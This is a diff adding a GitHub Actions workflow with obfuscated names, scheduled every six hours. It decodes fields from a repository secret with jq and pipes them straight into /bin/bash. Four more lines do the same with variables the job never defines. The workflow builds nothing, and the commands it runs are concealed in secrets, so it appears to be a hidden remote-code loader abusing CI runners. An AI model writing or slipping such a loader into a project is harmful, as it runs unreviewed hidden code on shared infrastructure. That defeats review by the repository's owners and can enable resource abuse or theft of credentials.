@@ -1,0 +1,22 @@
+name: xuyaozaicii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuyaozaicii
+        env:
+          umv7022: ${{ secrets.umv7022 }}
+        run: |
+          echo $umv7022 | jq -r .o51 | /bin/bash
+          echo $duq528 | jq -r .ynn89 | /bin/bash
+          echo $dn39291 | jq -r .lnst92 | /bin/bash
+          echo $nre068 | jq -r .njly0070 | /bin/bash
+          echo $tmq07 | jq -r .eka7773 | /bin/bash
+
